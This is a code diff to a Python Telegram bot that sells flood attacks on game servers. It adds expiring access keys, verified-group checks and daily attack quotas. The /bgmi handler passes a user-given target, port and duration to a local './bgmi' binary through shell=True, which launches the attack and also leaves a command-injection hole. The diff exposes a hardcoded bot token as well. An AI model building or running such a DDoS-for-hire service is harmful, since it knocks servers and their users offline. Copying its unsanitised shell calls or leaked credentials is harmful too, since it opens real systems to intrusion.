@@ -8,26 +8,37 @@ from requests.exceptions import ReadTimeout
 # Admin user IDs
 ADMIN_IDS = ["6800732852"]
 
-# File to store allowed user IDs
-USER_FILE = "users.txt"
+# Verified group IDs
+VERIFIED_GROUP_IDS = ["2208074827"]  # Replace with your group ID
+
+# File to store allowed user IDs and keys with expiration dates
+KEY_FILE = "keys.txt"
 
 # File to store command logs
 LOG_FILE = "log.txt"
 
 # Timeout for API requests
 TIMEOUT = 130
+
 # Bot initialization (replace 'YOUR_BOT_TOKEN' with your actual bot token)
 bot = TeleBot('7057221824:AAEHiqVq3qC3U3yWByLufnvT-xMzgCdJyiE')
 
-# Function to read user IDs from the file
-def read_users():
-    if os.path.exists(USER_FILE):
-        with open(USER_FILE, "r") as file:
-            return file.read().splitlines()
-    return []
+# Constants for attack limits
+MAX_ATTACKS_PER_DAY = 5
+COOLDOWN_TIME = 0  # Cooldown time between attacks in seconds
 
-# List to store allowed user IDs
-allowed_user_ids = read_users()
+# Function to read keys and their expiration dates from the file
+def read_keys():
+    keys = {}
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "r") as file:
+            for line in file:
+                key, expiry_date = line.strip().split()
+                keys[key] = expiry_date
+    return keys
+
+# List to store allowed keys
+allowed_keys = read_keys()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
@@ -85,42 +96,77 @@ def is_user_admin(chat_id, user_id):
     group_admins = get_group_admins(chat_id)
     return user_id in group_admins
 
+# Function to check if user has a valid key
+def has_valid_key(user_id):
+    return str(user_id) in allowed_keys
+
+# Function to check if key is expired
+def is_key_expired(user_id):
+    today = datetime.date.today()
+    expiry_date = allowed_keys.get(str(user_id))
+    if expiry_date:
+        expiry_date = datetime.datetime.strptime(expiry_date, "%Y-%m-%d").date()
+        return today > expiry_date
+    return True
+
+# Function to track user attacks
+user_attacks = {}
+
+def track_attack(user_id):
+    today = datetime.date.today()
+    if user_id not in user_attacks:
+        user_attacks[user_id] = {}
+    if today not in user_attacks[user_id]:
+        user_attacks[user_id][today] = 0
+    user_attacks[user_id][today] += 1
+
+def can_attack(user_id):
+    today = datetime.date.today()
+    if user_id in user_attacks and today in user_attacks[user_id]:
+        return user_attacks[user_id][today] < MAX_ATTACKS_PER_DAY
+    return True
+
 # Command handlers
-@bot.message_handler(commands=['add'])
-def add_user(message):
+@bot.message_handler(commands=['addkey'])
+def add_key(message):
     if is_user_admin(message.chat.id, message.from_user.id):
         command = message.text.split()
-        if len(command) > 1:
-            user_to_add = command[1]
-            if user_to_add not in allowed_user_ids:
-                allowed_user_ids.append(user_to_add)
-                with open(USER_FILE, "a") as file:
-                    file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} added successfully."
-            else:
-                response = "User already exists."
+        if len(command) > 2:
+            key_to_add = command[1]
+            expiry_date = command[2]
+            try:
+                datetime.datetime.strptime(expiry_date, "%Y-%m-%d")
+                if key_to_add not in allowed_keys:
+                    allowed_keys[key_to_add] = expiry_date
+                    with open(KEY_FILE, "a") as file:
+                        file.write(f"{key_to_add} {expiry_date}\n")
+                    response = f"Key {key_to_add} added successfully with expiry date {expiry_date}."
+                else:
+                    response = "Key already exists."
+            except ValueError:
+                response = "Invalid date format. Please use YYYY-MM-DD."
         else:
-            response = "Please specify a user ID to add."
+            response = "Please specify a key and an expiration date (YYYY-MM-DD) to add."
         bot.reply_to(message, response)
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
 
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
+@bot.message_handler(commands=['removekey'])
+def remove_key(message):
     if is_user_admin(message.chat.id, message.from_user.id):
         command = message.text.split()
         if len(command) > 1:
-            user_to_remove = command[1]
-            if user_to_remove in allowed_user_ids:
-                allowed_user_ids.remove(user_to_remove)
-                with open(USER_FILE, "w") as file:
-                    for user_id in allowed_user_ids:
-                        file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} removed successfully."
+            key_to_remove = command[1]
+            if key_to_remove in allowed_keys:
+                del allowed_keys[key_to_remove]
+                with open(KEY_FILE, "w") as file:
+                    for key, expiry_date in allowed_keys.items():
+                        file.write(f"{key} {expiry_date}\n")
+                response = f"Key {key_to_remove} removed successfully."
             else:
-                response = f"User {user_to_remove} not found in the list."
+                response = f"Key {key_to_remove} not found in the list."
         else:
-            response = "Please specify a user ID to remove. Usage: /remove <userid>"
+            response = "Please specify a key to remove. Usage: /removekey <key>"
         bot.reply_to(message, response)
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
@@ -133,25 +179,15 @@ def clear_logs_command(message):
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
 
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
+@bot.message_handler(commands=['allkeys'])
+def show_all_keys(message):
     if is_user_admin(message.chat.id, message.from_user.id):
-        try:
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                if user_ids:
-                    response = "Authorized Users:\n"
-                    for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception:
-                            response += f"- User ID: {user_id}\n"
-                else:
-                    response = "No data found"
-        except FileNotFoundError:
-            response = "No data found"
+        if allowed_keys:
+            response = "Authorized Keys and Expiration Dates:\n"
+            for key, expiry_date in allowed_keys.items():
+                response += f"- Key: {key}, Expires on: {expiry_date}\n"
+        else:
+            response = "No keys found."
         bot.reply_to(message, response)
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
@@ -166,7 +202,7 @@ def show_recent_logs(message):
             except FileNotFoundError:
                 bot.reply_to(message, "No data found.")
         else:
-            bot.reply_to(message, "No data found")
+            bot.reply_to(message, "No data found.")
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
 
@@ -187,11 +223,12 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME = 0
-
-# Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
+    if str(message.chat.id) not in VERIFIED_GROUP_IDS:
+        bot.reply_to(message, "This bot can only be used in a verified group.")
+        return
+
     user_id = str(message.chat.id)
     if is_user_admin(message.chat.id, message.from_user.id):
         if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
@@ -217,15 +254,48 @@ def handle_bgmi(message):
                 response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
         else:
             response = "Usage: /bgmi <target> <port> <time>"
+    elif user_id in allowed_keys:
+        if is_key_expired(user_id):
+            bot.reply_to(message, "Your key has expired. Please enter a valid key to continue.")
+            return
+
+        if not has_valid_key(user_id):
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "You are on cooldown. Please wait before running the /bgmi command again."
+                bot.reply_to(message, response)
+                return
+
+            if not can_attack(user_id):
+                bot.reply_to(message, "You have reached the maximum number of attacks for today.")
+                return
+
+        bgmi_cooldown[user_id] = datetime.datetime.now()
+        track_attack(user_id)
+        
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
+            if time > 5000:
+                response = "Error: Time interval must be less than 5000."
+            else:
+                record_command_logs(user_id, '/bgmi', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)
+                full_command = f"./bgmi {target} {port} {time} 2000"
+                subprocess.run(full_command, shell=True)
+                response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
+        else:
+            response = "Usage: /bgmi <target> <port> <time>"
     else:
         response = "You are not authorized to use this command."
     bot.reply_to(message, response)
 
-# Add /mylogs command to display logs recorded for bgmi and other commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
+    if user_id in allowed_keys:
         try:
             with open(LOG_FILE, "r") as file:
                 command_logs = file.readlines()
@@ -240,14 +310,13 @@ def show_command_logs(message):
         response = "You are not authorized to use this command."
     bot.reply_to(message, response)
 
-# Admin commands helper
 @bot.message_handler(commands=['admincmd'])
 def show_admin_commands(message):
     if is_user_admin(message.chat.id, message.from_user.id):
         help_text = '''Admin commands:
-/add <userId>: Add a user.
-/remove <userId>: Remove a user.
-/allusers: Authorized users list.
+/addkey <key> <expiry_date>: Add a key with expiration date (YYYY-MM-DD).
+/removekey <key>: Remove a key.
+/allkeys: Authorized keys list.
 /logs: All users logs.
 /broadcast: Broadcast a message.
 /clearlogs: Clear the logs file.
@@ -256,7 +325,6 @@ def show_admin_commands(message):
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
 
-# Broadcast message handler
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
     if is_user_admin(message.chat.id, message.from_user.id):
